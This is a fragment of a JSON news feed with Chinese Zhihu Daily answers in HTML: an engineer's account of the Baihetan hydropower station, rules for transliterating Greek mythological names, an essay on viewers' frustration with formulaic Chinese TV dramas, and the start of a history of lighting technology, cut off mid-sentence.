href=\"https://open.spotify.com/show/5dLciVkSqhvaVRUcYuKxZX\" target=\"_blank\">Spotify</a></li>\n<li><a href=\"https://www.xiaoyuzhoufm.com/podcast/5e3d212c418a84a046197d10?s=eyJ1IjoiNWU3YzlhYjlhMmYyZTUwM2NlYzNjZDcwIn0%3D%0A\">小宇宙</a></li>\n</ul>\n<p>感谢聆听，也欢迎大家留言交流、分享音乐，对节目有任何建议也欢迎提出～下期见！</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67540"},{"title":"单机容量世界第一的白鹤滩水电站正式投产发电，具有哪些重大意义？该水电站的工程技术在世界上是什么水平？","date":"2021-07-02 23:06:18","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-b2b5f1ec427c285c98ce98e66aefb849_l.jpg?source=8673f162\"><span>言踪，</span><span>水利工程设计师</span>\n<a href=\"https://www.zhihu.com/question/468406905/answer/1970589910\" hidden>阅读原文</a>\n</div>\n<div>\n<figure><img src=\"https://pic2.zhimg.com/v2-fb3bba2a17c6135cf8601ebbe11951d1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我院为之奋斗 30 年，我个人为之奋斗 11 年的电站终于投产了，非常激动！28 日晚上我们在食堂还开了酒，好多人都哭了，真的是太不容易了。</p>\n<p>我最近常跟人说的一句话就是，我们学的是水电专业，毕业后又深度参与世界最大的水电工程，并且把它顺利建成，刚好还赶上了 2021 年的七一，想想还真是热血澎湃，豪情万丈！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0de1edcf3d47c7d04282426d6facfd03_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2021 年 6 月大坝下游（航拍）</figcaption></figure><figure><img src=\"https://pic4.zhimg.com/v2-0512b1e55754afea49020b45a566a0bd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2021 年 6 月大坝上游</figcaption></figure><ul><li>\n<strong>工程意义方面：</strong>白鹤滩发电标志着金沙江下游水电基地开发完成，这个无需多说，为实现 2030 碳达峰、2060 碳中和起到重要作用。光是每年 624 亿度电、相应<strong>减碳</strong>5000 多万吨，白鹤滩的环境效益就已经非常突出。工程环境影响方面，对鱼类、鸟类、植物也都有妥善的综合保护措施。<br><br>第二是<strong>防灾</strong>，白鹤滩 206 亿立方米水库相当于乌东德、溪洛渡、向家坝三座姊妹水库之和，能够大大减轻长江中下游防洪压力。库区近 200 公里边坡的滑坡、塌岸、泥石流风险也得到了控制，提高了抵御自然灾害的能力。<br><br>第三是<strong>航运</strong>，白鹤滩水库形成后，金沙江下游四座水库库库相接，原来水流湍急、险滩遍布的金沙江成为深水航道，通过翻坝转运可将从上海到四川攀枝花的路线彻底打通。<br><br>第四是<strong>脱贫</strong>，可能很多人还不知道，白鹤滩 2000 多亿投资里面超过一半是移民工程，库区七个县原来全是贫困县，去年底 47 个新建村镇、16 条新建公路陆续建成，一夜鸟枪换炮，也算是狠狠助攻了一记脱贫攻坚。<br><br>最后是<strong>科技</strong>，四十年前我们的工程技术和装备制造水平是发达国家的跟随者，二十年前我们可以说是并行者。到了白鹤滩，世界第一的百万千瓦机组全部国产，工程所有设计、建设、制造、安装团队都是中字头企业，我们可以骄傲地说已经是领跑者。</li></ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-bc152b28525858a03bb17bb20c614249_720w.jpg?source=8673f162\" alt=\"\"><figcaption>世界水电看中国！</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-b7b1ae5b2bb054c10a3572c5f71c98ca_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2020 年 8 月白鹤滩左岸地下电站 1 号机组转子吊装</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-09271b6d823585ee5514118b972ed30e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>白鹤滩机组示意图，注意顶部那个人有多大</figcaption></figure><ul><li>\n<strong>科技进步方面：</strong>白鹤滩水电站不只有 6 个第一。官媒常说的这 6 个第一其实是开工时三峡让我院总结出来的，但关键是我院的风格实在太过低调了，不是那种大幅跨越、极其重大的指标都不太想提。前几天我们几个年轻人盘了一下，主要指标至少有 18 个世界第一：</li></ul>\n<ol>\n<li>\n<strong>最难的大坝工程：</strong><br> 椭圆线形拱坝高度世界第一<br> 特高拱坝抗震参数世界第一<br> 反拱水垫塘规模世界第一<br> 大坝浇筑缆机群规模世界第一<br> 全坝采用低热水泥世界第一<br> 地形地质复杂程度世界第一</li>\n<li>\n<strong>最大的地下电站：</strong><br> 主厂房尺寸世界第一<br> 尾水调压室尺寸世界第一<br> 500 千伏出线井尺寸世界第一<br> 尾水管闸门室高度世界第一<br> 无压泄洪洞尺寸世界第一<br> 发电进水塔尺寸世界第一</li>\n<li>\n<strong>最强的水电装备：</strong><br> 单台机组功率世界第一<br> 单相变压器功率世界第一<br> 桥式起重机规模世界第一<br> 门式起重机规模世界第一<br> 三支臂弧门尺寸世界第一<br> 叠梁式闸门数量世界第一</li>\n</ol>\n<p>其实中国很多工程都能端出一两项世界第一，但像白鹤滩这样几乎所有主要指标都是世界第一或者世界第二第三的（总装机第二、发电量第三、水推力第二、泄洪功率第三等）就非常罕见了。这些指标相叠加，对设计建设难度的增益是难以想象的。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7fa7ebf390f09922a4aeea534263e52b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2017 年 8 月中国电建华东院白鹤滩勘测设计员工代表合影</figcaption></figure><p>我院最早一批人是 1991 年进驻白鹤滩，因为前期国家给的研究经费很有限，又还没有明确由三峡投资，那真是全院勒紧裤腰带支持白鹤滩，最困难的时候把办公大楼都抵押出去贷款，到 2001~2002 年列入原国家计委工作计划、三峡“带资进组”之后才有所缓解。这第一个十年，关键词可以说是<strong>艰苦</strong>。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f80004c3611f9fa79eb8723d6b24478a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>针对坝基的水上勘察</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-3a760571d854d7234a0e91a4d0a2f177_720w.jpg?source=8673f162\" alt=\"\"><figcaption>风餐露宿</figcaption></figure><p>2001~2010 年，我院相继完成预研、可研，勘探量几乎超越三峡工程。期间还联合了清华、武大、河海、川大（母校赛高！）、天大、大工和中科院、工程院、水科院、南科院等顶级科研机构完成了 200 多项技术攻关，还有三峡、东电、哈电共同努力，解决了数不清的世界级关键技术难题，形成了稳妥可行的设计方案。可以说是全中国最顶尖的科技力量，打造了世界最顶尖的水电工程。这第二个十年，关键词可以说是<strong>突破</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9b75c9d1bd7af456dc88201696cf3337_720w.jpg?source=8673f162\" alt=\"\"><figcaption>水利毕业的胡主席 2011 年还去清华看过我院做的模型</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-36934cc6db0c66e6c94ac308025d42d0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>我院专家在现场会议室讨论右岸边坡开挖方案</figcaption></figure><p>2010~2021 年，白鹤滩进入施工阶段。我院继续负责这一阶段的勘察设计，并负责施工现场的技术保障服务。在三峡统筹下，中国电建四局、五局、六局、七局、八局、十局、十四局、十六局以及葛洲坝、安能、中交、中铁等全中国最顶尖的施工团队（中国电建占 80%），将宏伟蓝图一点点变成了美好现实。这第三个十年，关键词可以说是<strong>筑梦</strong>。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-6daca57f5dd1fdd69323a1be22b6dfcb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>我院专家在地下厂房研讨支护方案</figcaption></figure><figure><img src=\"https://pic4.zhimg.com/v2-268c8371010a0b8b25195ec36e0639d1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>2021 年 6 月即将投产发电的白鹤滩左岸地下电站 1 号机</figcaption></figure><p>我 2010 年来到白鹤滩一直到现在，赶上了最后一个十年，当然也是最精彩纷呈的十年。身边的这些设计人员可以说是无一日安寝。夜以继日点灯熬油不说了，996 也算当代年轻人的常态（大误），关键是心里悬着——搞地下工程的跟我说梦见顶拱塌了、厂房废了，搞大坝的跟我说梦见大坝倒了、他们手拉手站到江里去。俗话说个人的发展进一寸有一寸的欢喜，但在工程界，比已有工程多一寸、高一寸都是挑战、都是未知。大坝基础处理、混凝土温度控制、巨型洞室开挖、百万机组研发、生态环境保护……十年来我们克服了多少困难，战战兢兢、如临深渊、如履薄冰，才终于走到了这一天！</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-88896db2ceda1f40c8c2501350821115_720w.jpg?source=8673f162\" alt=\"\"><figcaption>机组蜗壳安装</figcaption></figure><p>昨晚与水电八局项目部的团委书记吃饭，他端起一杯酒跟我说，2015 年他大四来白鹤滩实习的时候，我还给他们讲过课，坚定了他毕业后来白鹤滩工作的信心。他说，薪火相传，我深以为然——白鹤滩巨型水电站投产发电，是我们这代人站在前辈们的肩膀上，为中国能源事业和科技进步做了一点微小的贡献。明天是七一，我想说，我们这代人没有辜负前辈们的期望，我们这代人对得起这片土地上的先烈们的牺牲。希望我们能接过他们手里的旗帜，为中华之复兴作出新的贡献！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/468406905\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737772"},{"title":"为什么希腊神话专名翻译频繁出现不常用的「忒（tè）」而不是「特」？","date":"2021-07-02 23:06:13","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/688373380_l.jpg?source=8673f162\"><span>畅畅，</span><span>谢天谢地你来啦</span>\n<a href=\"https://www.zhihu.com/question/22979518/answer/23298670\" hidden>阅读原文</a>\n</div>\n<div>\n<p>竟然被 <a href=\"http://www.zhihu.com/people/bd0d8df0510288540d68d50b6dcc8fbe\">@張冬磊</a> 先生点了评论看到，既如此我就进一步梳理一下这个题吧，希望<a href=\"http://www.zhihu.com/people/5ddfb07ceec73d6d18c40d821d22df75\">@张孟杨</a>同学不要介意，我是来补充的。</p>\n<p>一、孟杨同学说的很对，罗念生先生在翻译希腊史诗时，是很讲究的，「忒」与「特」的选取差别在于τ/t/ 和θ/tʰ/ 后面有没有接元音字母η（ē）、ε（e）。但是「[e][ei][e:]」几个元音音素的说法不太准确，因为这些是近代语言学家对古典希腊语 eta 和 epslion 的拟音，本身其具体发音随时代不同，变化也很大。</p>\n<p>另外，「忒」不用于Ἀθηνᾶ（Athēnā 雅典娜）这种固定翻译中。</p>\n<p>二、在孟杨同学回答的基础上，我再整理几个类似的音译规律（括号内的都是拉丁字母转写）：</p>\n<p>（一）<strong>以后面有没有接元音为区别的同音音译字</strong></p>\n<p>1、δ（d）</p>\n<p><strong>「得」</strong>用来翻译δ后面有元音字母η、ε的情况，例如 Hādēs 哈得斯、Dēmētēr 得墨忒尔（Mēdea 美狄亚固定翻译除外）；</p>\n<p><strong>「德」</strong>用来翻译δ后面没有元音字母的情况，例如 Cassāndra 卡珊德拉、Cādmus 卡德摩斯。</p>\n<p>2、κ（c）、χ（ch）以及ξ（x）</p>\n<p><strong>「刻」</strong>用来翻译κ和χ后面有元音字母η、ε的情况，例如 Eurydicē 欧律狄刻、Andromāchē 安德洛玛刻；</p>\n<p><strong>「克」</strong>用来翻译κ、χ后面没有元音字母以及ξ（发音为 /ks/）的情况，例如 Hectōr 赫克托耳、Chronus 克洛诺斯、Ixiōn 伊克西翁。</p>\n<p>3、γ（g）</p>\n<p><strong>「革」</strong>用来翻译γ后面有元音字母η、ε的情况，例如 Agēnōr 阿革诺尔、Iphigenia 伊菲革尼亚；</p>\n<p><strong>「格」</strong>用来翻译γ后面没有元音字母的情况，例如 Graecus 格剌伊科斯、Aeglē 埃格勒。</p>\n<p>4、φ（ph）</p>\n<p><strong>「福」</strong>用来翻译φ后面有<strong>元音字母ο、ω</strong>的情况，例如 Sisyphus 西绪福斯、 Phoenix 福尼克斯；</p>\n<p><strong>「佛」</strong>用来翻译φ后面没有元音字母的情况，例如 Aphrodītē 阿佛洛狄忒、Iphthīmē 伊佛提墨。</p>\n<p>（二）<strong>λ（l）和ρ（r/ rh）的同音异调音译字</strong></p>\n<p>1、λα为拉（Laocoön 拉奥孔），ρα为剌（Hēraklēs 赫剌克勒斯）</p>\n<p>2、λι为利（Libya 利彼亚），ρι为里（Pāris 帕里斯）</p>\n<p>3、λο和λω为罗（Apollō 阿波罗），ρο和ρω为洛（Erōs 厄洛斯）</p>\n<p>4、λυ为吕（Calypsō 卡吕普索），ρυ为律（Eurymachus 欧律玛科斯）</p>\n<p><strong>（三）ι（i）和υ（y）的同音异调或同调异音的音译字</strong></p>\n<p>1、δι为狄（Dionysus 狄俄倪索斯），δυ为底（Odysseus 俄底修斯）</p>\n<p>2、θι和τι为提（Antigonē 安提戈涅），θυ和τυ为堤（Pithys 庇堤斯）</p>\n<p>3、μι为弥（Thermis 忒尔弥斯），μυ为密（Smyrna 斯密耳娜）</p>\n<p>4、νι为尼（Mānia 玛尼亚），νυ为倪（Erīnnyes 厄里倪厄斯）</p>\n<p>5、πι为庇（Epīrus 厄庇洛斯），πυ为皮（Pygmāliōn 皮格玛利翁）</p>\n<p>6、φι为菲（Amphitryōn 安菲特律翁），φυ为费（Zephyrus 仄费洛斯）</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/22979518\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737712"},{"title":"你看剧会有「剧怒症」吗？国产剧的 bug 该作何解？","date":"2021-07-02 23:06:07","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-0930a1e80722113e563ead364519ddf5_l.jpg?source=8673f162\"><span>是古米呀，</span><span>新传考研三跨上岸，懒癌晚期，努力分享ing</span>\n<a href=\"https://www.zhihu.com/question/464921539/answer/1965969341\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>这届观众被国产剧逼出了“剧怒症”。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-ecebaf8658dcc45fa58561e09cffb6ff_720w.jpg?source=8673f162\" alt=\"\"></figure><p>国产剧里刚毕业的主人公，月薪三千却住着北上广市中心的大开间。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-914b79d4efe578353fdadafb67d4fce0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>国产剧里的主人公是打工人却从来不用上班，每天有大把的时间谈恋爱。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-23b8f62222316e2c572bf47f8fd9e5c5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>国产剧里的主人公明明是学霸人设，可就是从来不学习。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f8ba9d17892dcca975e535b687f36a63_720w.jpg?source=8673f162\" alt=\"\"></figure><p>明明是为了放松解压才看剧，结果剧中人物设定和剧情太过“降智”，不仅没解压，反而气出了“剧怒症”——<strong>大家看到电视剧中超级不合常理的或者让人心塞的剧情时，会感到由内而外的愤怒，这种症状在看现代剧时更为明显。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-381d910e66824b7fc7fd379b4b04a577_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不知从何时起，国产剧总是和“悬浮”“套路”联系在一起，无论是职场剧还是校园剧，本质上都是披着外衣的偶像剧；<strong>无论是甜宠剧还是伦理剧，本质上都是牵强附会的套路剧。</strong></p>\n<p>国产剧这是怎么了？观众们的“剧怒症”还有解么？</p>\n<p><strong>01.<strong>现实题材剧，从刻画时代到悬浮套路</strong></strong></p>\n<p>现实题材剧，是一种以现实生活为题材，以当代社会为背景讲述时代故事的类型剧。<strong>自改革开放以来，现实题材剧就是刻画时代、引领思想的重要艺术表达形式。</strong></p>\n<p>80 年代，受“改革思潮”的影响，出现了一批反映“社会改革”和“伤痕文学”的现实题材剧。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ced6ad225bfcf75f04fa68482560a7ac_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《蹉跎岁月》反映了特殊时期云南知青上山下乡的情感和工作经历，回味动荡年代的青春岁月，<strong>用艺术力量修复人们的精神创伤；</strong>《篱笆·女人和狗》则描绘了农村女人冲破封建婚姻思想桎梏，勇敢寻求个人幸福的故事，<strong>有着极大的解放思想的意义。</strong></p>\n<p>90 年代，中国社会进入转型期，现实题材剧开始更加关注普通人的日常生活。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ec54a389c3553dc68d5f2e9d126ac4ca_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《渴望》通过对两对年轻人复杂爱情经历的描述，<strong>将人生和人性的一切有机地融入到时代的大背景中</strong>，首播时曾万人空巷；《编辑部的故事》开中国电视剧系列喜剧先河，<strong>用夸张和调侃的手法揭露人性，剧中不少段子至今仍为人津津乐道。</strong></p>\n<p>进入 21 世纪，都市情感剧和职场行业剧开始崭露头角。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-8e7fc3a251991ccebeaa74fc875f9014_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《蜗居》播出时正值上海房价开始飙升，<strong>剧集以当代大学生留城奋斗买房为线索，集结了当下包括小三、高官、房奴、腐败等多重社会问题</strong>；《不要和陌生人说话》是中国第一部直观反映家庭暴力的影视作品，通过对暴力家庭成员心态变化的精准刻画，<strong>引发全社会对家庭暴力这一隐蔽性问题的强烈关注。</strong></p>\n<p><strong>现实题材剧在关注社会生活、呈现人生百态，对社会现实进行批判、引人深省方面，具有不可替代的重要审美艺术功能和社会价值。</strong>现在，我国已是电视剧第一生产大国、第一播出大国，年产电视剧三百余部、一万多集，<strong>其中，现实题材剧占据 70%的份额。现实题材剧井喷式的增长，形成了良莠不齐、泥沙俱下的局面。</strong></p>\n<p><strong>尽管也不乏有《人民的名义》《大江大河》《山海情》等优秀作品存在，但现实题材剧的悬浮套路之风也愈演愈烈。</strong>不少表现职场生活的职场行业剧，在专业度上乏善可陈，连身为外行的普通观众都能轻易识破漏洞；表现情感生活的都市情感剧，要么就是“误会、同居、分手、和好”剧情庸俗毫无新意，要么就是原生家庭、婚姻出轨、婆媳关系等狗血元素大杂烩。<strong>人物脸谱化、剧情套路化、内核浅薄化，即便是主演阵容强大、制作成本不菲，也还是难孚众望，豆瓣评分普遍在 3-5 分。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0d75438d0c582ed774fd64a16ed9aaae_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>本应根植于日常生活反映时代发展、社会变迁的现实题材剧，从人物设定、到场景设置再到剧情逻辑，都严重脱离现实生活，成为虚无和浮夸的“伪现实主义”，也就失去了其存在的价值和意义。</strong></p>\n<p><strong><strong>02.电视剧生产，从艺术创作到工业快消</strong></strong></p>\n<p><strong>电视剧生产周期加快，是产量猛增的最重要原因。</strong>新京报记者曾统计 2018 年 11 月 -2019 年 1 月杀青的剧集，发现有 50%以上的剧拍摄周期为一集 1-2 天，而在上世纪八九十年代，拍摄一集要 7-15 天。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-77df7c768994a365837e7c6bc5b84bd4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图源：新京报 可横屏查看</figcaption></figure><p><strong>当然，拍摄周期加快很大程度上要归功于技术进步、统筹模式改进带来的效率提升，并不一定是坏事。</strong>《大江大河》的平均拍摄时间也是 2.4 天一集，可见拍摄时长并不一定和“烂片”挂钩。</p>\n<p><strong>可问题在于，片方对编剧创作剧本的要求也在加快。</strong>编剧原子弹透露，近几年的很多剧集，片方给到编剧创作采风的时间最多只有一两个月。同时，行业中不少年轻编剧毕业后立即开始从事编剧工作，除了自己熟悉的人群外，没有接触过任何一个正常工作人群。<strong>在生活体验严重匮乏、创作周期又极为短暂的情况下，不可避免地会创作出许多“套路”剧本。</strong>用编剧高璇的话来说，就是“<strong>不用去做大量采访，不用真正地去写一个行业、一类人群，只要把掌握的技巧和戏剧套路负载在故事和人物上即可”。</strong></p>\n<p>仓促的剧本准备和严苛的拍摄周期，<strong>使得电视剧生产形成了一种流水线的创作模式</strong>，先谈好项目和演员，让编剧在短期内创作出剧本，在拍摄时压缩周期赶项目赶进度。<strong>电视剧的生产俨然从艺术创作变成了工业快消品，正如阿多诺所指出的那样，电视剧变成一种可以大规模复制的文化工业产品，按照标准化流程进行制作，衍生出虚假的风格和个性，其变化只是表面的变化，属于艺术创作的独一无二的独创性已经不复存在了。</strong></p>\n<p>于是我们看到，电视剧里的富二代男主角总是叛逆的，在剧集开始时拒绝继承家族企业、独自创业失败结局时又回归家庭继承家族企业；电视剧里的贫穷女主角总是善良的，就算一路凭借着男主或是金手指过关斩将但也仍要强调自己是“靠自己”成功的。女配总是恶毒心机的，男配总是温柔多情的。就算披上了职场、校园等不同的外衣，本质上也仍是换汤不换药。<strong>大规模快生产与优质内容创作的模式完全背道而驰，将电视剧变成了机械复制品，也让观众陷入审美疲劳。</strong></p>\n<p><strong>因为想要写出一部优秀的现实题材剧本，必须要求编剧能够深入生活。编剧在写作剧本时，往往要经历漫长的取材和采访工作。</strong>《隐秘而伟大》的编剧就为创作耗费大量精力前往博物馆查阅资料、前往上海实地查看街道和建筑；《大江大河》写分集大纲就耗时七个月，《山海情》也用了五个月夯实剧本寻找最恰当的表达方式。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-fadeb4a9717540cc7d9b083bd159de17_720w.jpg?source=8673f162\" alt=\"\"></figure><p>正如编剧宋方金所说，“现在的影视创作，<strong>很多都是从生意的角度出发</strong>，而不是从生活的角度出发，这种初衷很难达到现实主义的高度。”</p>\n<p><strong>03.<strong>电视剧投资，数据导向的无创意偏好</strong></strong></p>\n<p><strong>影响电视剧题材和质量的另一重要因素，则是影视投资方的偏好。</strong>很容易理解，投资方更倾向于投资的影视剧类型，生产出来的影视剧集也就更多；投资方不看好的影视剧类型，生产出来的影视剧集也会减少。同时，投资方的投资信心和投入金额也会影响到剧集的呈现水平。</p>\n<p><strong>而如今，影视行业的投资则是绝对的“唯数据论”，收视率、点击量压倒一切。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e3631ae96fad77440b56d7f7a730c63d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>知名编剧汪海林曾在 2020 年观学院的演讲中揭露了影视行业的“唯数据论”。他指出，<strong>在以前，影视剧行业通常有一个典型的现象，那就是剧的口碑和收视率不一定挂钩。</strong>许多行业内认可的口碑好剧，收视率往往并不佳，很多剧要等到很多年后才沉淀出口碑，比如《士兵突击》《激情燃烧的岁月》《武林外传》等。</p>\n<p>大概在 2009 年前后，出现了一种“卫视排名”机制，各地卫视按照收视率和市场占有率进行排名，而广告商就根据这个排名进行投放。<strong>自此以后，收视率就取代了剧集口碑和内容题材本身的意义，压倒一切，成为决定性的、唯一的指标。而网络时代，则是视频网站的点击率成为唯一的指标。</strong>影视行业的投资转向彻底的“唯数据”导向。</p>\n<p>这种唯数据导向的危害无疑是巨大的。<strong>首先是催生了大量的数据黑产，包括虚假点击率、虚假好评和恶意中伤竞争对手，将整个行业拖入劣币驱逐良币的恶性竞争泥潭。</strong></p>\n<p><strong>更为严重的，则是以数据为唯一导向的投资，会不可避免地倾向于“无创意”的保守偏好。</strong>投资方往往会根据以往的数据来判断哪些剧更对观众胃口，哪些剧更可能会火，<strong>资本总是趋利避害，总是会倾向于投向已经被验证过成功的类型和题材，而避免尝试创新的风险。</strong>但数据所呈现的市场取向是滞后的，社会大背景在变，观众的口味也在变，保守无创意的投资偏好势必会与观众的需求相偏离。</p>\n<p>2019 年，J Lin 和 JD Kloet 两位学者研究了短视频快手平台中广大的农村内容生产者，发现他们在对平台算法推荐机制和政府管制的想象之下，<strong>逐渐成为了一个“无创意生产阶层”。</strong>因为他们不知道什么样的内容会火，只能在某种类型的内容火了以后，跟风制作类似的内容；因为从算法推荐的逻辑上来看，已经火了的内容会获得更多的流量。<strong>对于绝大多数内容生产者而言，算法鼓励的是对已有火爆内容的模仿，而不是创新。因此，本来的创意产业变成了无创意产业，创意和创新不再，只余千篇一律的内容。</strong></p>\n<p>影视剧的数据导向投资偏好与其极其相似。贝尔纳·米耶热在《文化商品》一书中就指出，相<strong>比于其他产品，文化产品想要在市场中实现价值交换将面临着更大的不确定性。</strong>这包括成片效果的不确定性、政策管制的不确定性和市场偏好的不确定性等。<strong>在这种高风险的投资环境下，投资方不可避免地也会走向保守和“无创意”，更青睐于如法炮制一些已有的剧集和模式，或者是启用一些自带流量的明星翻拍一些风险不高的内容。</strong>其结果也就是如此——快生产、轻内容的悬浮剧，无新意、无创意的套路剧遍地。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7226044e6935e0f0bb16dbd12dae21e3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>今年的白玉兰奖，重大革命历史题材剧《觉醒年代》摘得最佳编剧（原创）、最佳导演和最佳男主角三大奖项，可谓是一骑绝尘、众望所归。男主角于和伟在接受采访时谈到网友的肯定，他说：“<strong>永远不要低估了观众，尤其是年轻观众的审美判断力”。</strong>这句话道出了不少观众的心声。</p>\n<p>如今的观众并不是就喜欢谈情说爱的偶像剧和轻松无脑的甜宠剧，年轻观众也绝非审美水平低下，而是他们的审美需求没有被很好地满足。<strong>观众的“剧怒症”，是观众对现实题材剧直面现实引领价值的热切需求，同影视制作方和投资方浮躁不实、追名逐利、保守偏好的影视剧生产投资现状之间矛盾的集中体现。</strong>或许，想要彻底清除各种“悬浮剧”“套路剧”绝非一朝一夕之事，<strong>但尊重观众、尊重现实应该是起码的底线。</strong></p>\n<p><strong>参考文献：</strong></p>\n<p>杨明品 胡祥《改革开放 40 年中国电视剧创作的根本经验》</p>\n<p>刘玲《“悬浮剧”——国产都市剧的伪现实主义倾向》</p>\n<p>J Lin，JD Kloet《Platformization of the Unlikely Creative Class: Kuaishou and Chinese Digital Cultural Production》</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/464921539\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737677"},{"title":"这 100 年来，中国科技数码行业有哪些飞跃发展的成果让你感到骄傲和自豪？","date":"2021-07-02 23:06:01","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-6e40df9ba833d84b9f10559157e1f782_l.jpg?source=8673f162\"><span>Calvin，</span><span>一枚聪明又傲娇的硬件工程师！</span>\n<a href=\"https://www.zhihu.com/question/468832684/answer/1973027785\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong><strong>一个问题</strong></strong></p>\n<p>大家知道中国人自己的第一盏白炽灯、荧光灯、高压汞灯是什么时候点亮的吗？</p>\n<hr>\n<p><strong>世界光源史，短短不过百余年</strong></p>\n<p>世界光源的历史，即从白炽灯开始的历史，至今不过百余年。 1850 年，英国人约瑟夫·威尔逊·斯旺爵士发明了世界上第一盏白炽灯，并于 1861 年申请了白炽灯设计专利。 但是由于当时抽真空的技术很差，灯泡中的炭丝稍遇氧气，即很快燃断，实用性很差。 当时，爱迪生也在钻研白炽灯技术，他说服了斯旺加入他的公司从而实际拥有了白炽灯的专利，在此基础上研制改良出基于碳化纤维灯丝的白炽灯泡。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2af1fbad17e9004dc6ca72ca6c7a84fc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>白炽灯</figcaption></figure><p><strong>1879 年，爱迪生点燃了世界上第一盏实用的白炽灯泡</strong>，这盏白炽灯可以持续亮 1200 小时。 正是基于这项技术，爱迪生于次年 1880 年创办了爱迪生电气照明公司。</p>\n<p>白炽灯技术给现代照明行业带来了科技革命， 到那时白炽灯却始终面临着低效能的问题 - 只有不到 10%的电能会被转化为光，而剩下的超过 90%的能量都会转为为无用的热能被耗散掉。先解决吃饱，再解决吃好，寻找一种更高效的光源势在必行。</p>\n<p>1910 年，法国人 A·克洛德发明了氖气放电灯，他将汞充入玻璃灯管中制成了辐射蓝光的灯管，后来又在灯管内壁涂敷荧光粉制成了辐射白光的灯管。</p>\n<p><strong>1939 年，在纽约和洛杉矶世博会上，世界上第一盏实用的荧光灯得以展示</strong>。它通过加热灯管两端的灯丝释放出电子并激发水银蒸气形成等离子体，辐射出短波紫外线，紫外线被灯管内测涂敷的含磷荧光粉吸收转化成可见光，这个过程也正是这种光源用“荧光”命名的原因。</p>\n<p>荧光灯发光效率高，发光面积大。同样亮度的荧光灯管大于只需要消耗白炽灯 1/3 至 1/4 的电能，寿命也更长。 这也正是在 LED 出现前 荧光灯被称为“节能灯”的原因。 有趣的是，荧光灯的发明者也有诸多争议，但是通用电气公司通过一系列专利整合收购最后成为荧光灯技术的真正拥有者及真正的发扬者。</p>\n<p>在荧光灯技术发展的同时，另一种技术的光源也在悄然成形 - <strong>高压气体放电灯 HID（High Intensity Discharge）</strong>。这种光源凭借特殊设计， 在灯管内部涂敷石英或铝，并透过两端钨电极打出来的加压电弧，通过灯管后而发出光线。 HID 的灯管内充满了气体和金属，气体帮助灯泡启动，而金属加热达到蒸发点，形成等离子体后发出光线。<strong>HID 包括： 高压汞灯， 金属卤化物灯，低压钠灯，高压钠灯。 </strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c534f3c91d47de23daa4269d59ed1328_720w.jpg?source=8673f162\" alt=\"\"><figcaption>使用在 IMAX 投影机上的 15 kW Xenon 短弧灯</figcaption></figure><p><strong>1932 年高压汞灯开始销售；1965 年通用电气获得了第一个金属卤化物灯专利，同年发布高压钠灯。 </strong>HID 光通量很高，一般能达到之前光源的 3-4 倍，寿命也较长，因此常用作户外如街道、路灯的照明。但其中高压、低压钠灯由于其单色性，显色指数非常低，大家可以回忆下小时候在钠灯下，看东西也是一偏昏黄的场景。</p>\n<p>白炽灯、荧光灯和 HID 可以合称为传统光源，这是因为到了 21 